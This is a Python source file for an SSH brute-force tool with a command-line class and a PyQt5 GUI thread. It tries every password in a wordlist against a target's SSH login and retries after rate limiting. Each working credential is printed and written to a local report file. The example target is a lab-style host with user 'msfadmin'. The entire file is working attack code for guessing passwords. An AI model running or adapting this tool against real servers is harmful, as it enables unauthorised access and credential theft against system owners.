import paramiko
import socket
from PyQt5 import QtCore
import time,subprocess as sp
import os

class SSH_Brut():

    def __init__(self):
        try:
            from colors import colorfoll

            self.GREEN = colorfoll.TextColor.green
            self.RED = colorfoll.TextColor.red
            self.RESET = colorfoll.TextColor.reset
            self.BLUE = colorfoll.TextColor.blue
        except:
            self.GREEN = '\033[32m'
            self.RED = '\033[31m'
            self.RESET = '\033[0m'
            self.BLUE = '\033[34m'

    def LogIn_SSH(self, ssh_ip_host, ssh_user, ssh_pass):
        ssh_Portcall = paramiko.SSHClient()
        ssh_Portcall.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh_Portcall.connect(hostname=ssh_ip_host, username=ssh_user, password=ssh_pass, timeout=3)
        except socket.timeout:
            print(f"{self.RED}[!] Host: {ssh_ip_host} is unreachable, timed out.{self.RESET}")
            return False
        except paramiko.ssh_exception.NoValidConnectionsError:
            print(f"{self.RED}[!]Unable to connect to port 22 on{ssh_ip_host}.{self.RESET}")
            return False
        except paramiko.AuthenticationException:
            print(f"[!] Invalid credentials for {ssh_user}:{ssh_pass}")
            return False
        except paramiko.SSHException:
            print(f"{self.BLUE}[*] Quota exceeded, retrying with delay...{self.RESET}")
            time.sleep(60)
            return self.LogIn_SSH(ssh_ip_host, ssh_user, ssh_pass)
        else:
            print(
                f"{self.GREEN}[+] Found combo:\n\tHOSTNAME: {ssh_ip_host}\n\tUSERNAME: {ssh_user}\n\tPASSWORD: {ssh_pass}{self.RESET}")
            if "nt" in os.name:
                dirk: str = str(sp.getoutput('powershell pwd'))
                dirk = dirk.replace(" ","").replace("\r","").replace("\n","").replace("'","").replace("Path","").replace("--","")
                if "\\brute\\protcal_brutfroce" not in dirk:
                    dirk  += "\\brute\\protcal_brutfroce"
                dirk = dirk.replace('\\brute\\protcal_brutfroce', '\\Reports\\brute-for\\')
            else:
                dirk: str = str(sp.getoutput('pwd'))
                if ("/brute/protcal_brutfroce" not in dirk):
                    dirk += "/brute/protcal_brutfroce"
                dirk = dirk.replace('/brute/protcal_brutfroce', '/Reports/brute-for/')
            with open(dirk + host + "_ssh.json","a") as dop:
                dop.write(f"{ssh_user}@{ssh_ip_host}:{ssh_pass}")
                dop.write("\n")
                dop.close()

            return True

class GUI(QtCore.QThread):

        Gui_Date_output = QtCore.pyqtSignal(object)

        def __init__(self, ssh_ip_host, ssh_user, ssh_pass) -> None:
            QtCore.QThread.__init__(self)
            self.ssh_ip_host = ssh_ip_host
            self.ssh_user = ssh_user
            self.ssh_pass = ssh_pass
            # print(self.domain_name)
            from colors import colorfoll
            self.GREEN = colorfoll.TextColor.green
            self.RED = colorfoll.TextColor.red
            self.RESET = colorfoll.TextColor.reset
            self.BLUE = colorfoll.TextColor.blue
        def is_ssh_open(self,pas):
            # initialize SSH client
            ssh_Portcall = paramiko.SSHClient()
            # add to know hosts
            ssh_Portcall.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh_Portcall.connect(hostname=self.ssh_ip_host, username=self.ssh_user, password=pas, timeout=3)
            except socket.timeout:
                # this is when host is unreachable
                print(f"{self.RED}[!] Host: {self.ssh_ip_host} is unreachable, timed out.{self.RESET}")
                self.Gui_Date_output.emit(str("[!] Host: " + self.ssh_ip_host + " is unreachable, timed out."))
                time.sleep(1)
                QtCore.QCoreApplication.processEvents()
                return False
            except paramiko.ssh_exception.NoValidConnectionsError:
                print(f"{self.RED}[!]Unable to connect to port 22 on{self.ssh_ip_host}.{self.RESET}")
                self.Gui_Date_output.emit(
                    str( "[!]Unable to connect to port 22 on" + self.ssh_ip_host))
                time.sleep(1)
                QtCore.QCoreApplication.processEvents()
                return False
            except paramiko.AuthenticationException:
                print(f"[!] Invalid credentials for {self.ssh_user}:{pas}")
                self.Gui_Date_output.emit(
                    str( "[!] Invalid credentials for " + self.ssh_user + " : " + pas))
                time.sleep(1)
                QtCore.QCoreApplication.processEvents()
                return False
            except paramiko.SSHException:
                print(f"{self.BLUE}[*] Quota exceeded, retrying with delay...{self.RESET}")
                self.Gui_Date_output.emit(
                    str( "[*] Quota exceeded, retrying with delay... " ))
                time.sleep(1)
                QtCore.QCoreApplication.processEvents()
                # sleep for a minute
                time.sleep(60)
                return self.is_ssh_open(pas)
            else:
                print(
                    f"{self.GREEN}[+] Found combo:\n\tHOSTNAME: {self.ssh_ip_host}\n\tUSERNAME: {self.ssh_user}\n\tPASSWORD: {pas}{self.RESET}")
                self.Gui_Date_output.emit(
                    str( "[+] Found combo:\n\tHOSTNAME:" + self.ssh_ip_host + "\n\tUSERNAME: " + self.ssh_user + " \n\tPASSWORD: " + pas))
                time.sleep(1)
                QtCore.QCoreApplication.processEvents()
                if "nt" in os.name:
                    dirk: str = str(sp.getoutput('powershell pwd'))
                    dirk = dirk.replace(" ","").replace("\r","").replace("\n","").replace("'","").replace("Path","").replace("--","")
                    if "\\brute\\protcal_brutfroce" not in dirk:
                        dirk  += "\\brute\\protcal_brutfroce"
                    dirk = dirk.replace('\\brute\\protcal_brutfroce', '\\Reports\\brute-for\\')
                else:
                    dirk: str = str(sp.getoutput('pwd'))
                    if ("/brute/protcal_brutfroce" not in dirk):
                        dirk += "/brute/protcal_brutfroce"
                    dirk = dirk.replace('/brute/protcal_brutfroce', '/Reports/brute-for/')
                with open(dirk + self.ssh_ip_host + "_ssh.json", "a") as dop:
                    dop.write(f"{self.ssh_user}@{self.ssh_ip_host}:{pas}")
                    dop.write("\n")
                    dop.close()
                return True
        def run(self) -> None:
            passlist = open(self.ssh_pass).read().splitlines()
            for password in passlist:
                if self.is_ssh_open(password):
                    break

if __name__ == "__main__":
    host = "192.168.82.128"
    passlist = "/home/shiky/PycharmProjects/scpt/brute/word_list.txt"
    user = "msfadmin"
    passlist = open(passlist).read().splitlines()
    sshB= SSH_Brut()
    for password in passlist:
        if sshB.LogIn_SSH(host, user, password):
            break